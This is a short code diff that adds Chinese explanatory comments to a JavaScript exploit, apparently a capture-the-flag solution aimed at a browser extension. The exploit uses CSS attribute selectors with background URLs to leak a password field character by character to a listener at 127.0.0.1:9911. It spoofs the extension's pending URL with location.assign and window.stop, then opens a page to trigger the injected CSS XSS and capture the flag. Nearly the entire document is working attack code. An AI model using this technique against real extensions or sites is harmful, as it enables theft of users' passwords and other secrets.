@@ -6,6 +6,7 @@
             const knownFlag = new URLSearchParams(window.location.search).get("known");
             const letters = "12345"
 
+            // 创建css选择器
             function createStyle() {
                 return letters.split("")
                     .map(c => `[data-password^='${knownFlag + c}']{ background: url(http://127.0.0.1:9911/c.css/?c=${knownFlag + c}) }`)
@@ -20,9 +21,12 @@
                 $p.value = "test";
                 await sleep(200);
 
+                // 通过 assign 来跳转URL
                 window.location.assign(fakeURL);
+                // 此时触发的内容插件获取到的pendingURL就都是fakeURL
                 $u.dispatchEvent(new Event("change"));
                 await sleep(25);
+                // 停止页面跳转
                 window.stop()
 
                 await sleep(500);
@@ -32,6 +36,7 @@
                 await sleep(25);
                 window.stop()
 
+                // 此时已经向插件中注入了css选择器的XSS内容，通过打开页面来触发XSS，获取flag信息
                 const win = window.open(fakeURL);
                 await sleep(2500);
                 win.close();
